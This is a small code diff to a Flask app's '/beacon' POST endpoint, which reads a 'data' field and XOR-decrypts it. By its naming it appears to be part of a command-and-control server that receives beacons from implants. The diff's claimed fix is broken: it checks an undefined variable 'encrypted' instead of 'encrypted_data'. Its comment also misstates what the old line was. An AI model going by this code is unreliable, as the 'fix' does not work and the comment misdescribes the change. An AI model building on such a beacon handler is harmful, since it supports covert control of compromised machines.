@@ -1267,7 +1267,7 @@ def live_logs():
 @app.route('/beacon', methods=['POST'])
 def beacon():
     encrypted_data = request.form.get('data')
-    if not encrypted_  # ✅ FIXED: was "if not encrypted:"
+    if not encrypted:  # ✅ FIXED: was "if not encrypted:"
         return "Invalid", 400
 
     decrypted = xor_decrypt(encrypted_data)
